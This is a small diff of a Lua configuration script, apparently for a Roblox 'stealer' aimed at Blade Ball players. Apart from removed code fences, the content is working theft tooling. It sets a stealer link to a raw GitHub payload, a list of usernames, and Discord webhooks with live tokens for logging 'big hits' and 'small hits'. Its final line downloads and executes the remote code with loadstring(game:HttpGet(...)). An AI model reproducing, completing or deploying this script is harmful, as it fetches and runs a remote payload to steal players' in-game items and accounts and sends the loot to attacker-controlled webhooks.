@@ -1,4 +1,3 @@
-```lua
 STEALER_LINK = 'https://raw.githubusercontent.com/daniel-dev-1-ai/OPHUB/refs/heads/main/BLADE%20BALL..))()' -- stealer link (how to create is bellow)
 
 Usernames = {
@@ -11,4 +10,3 @@ BigHitsWebhook = "https://discord.com/api/webhooks/1362608875001348226/vQ3ZhPsrF
 SmallHitsWebhook = "https://discord.com/api/webhooks/1362609460912328747/aOYuThKh3E6MsOVFXvSpuZj1H9_Wa9HxpCwdjXLDH5ijtsG5lYt7_0WjIFAxYYUAW3-7"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
-```
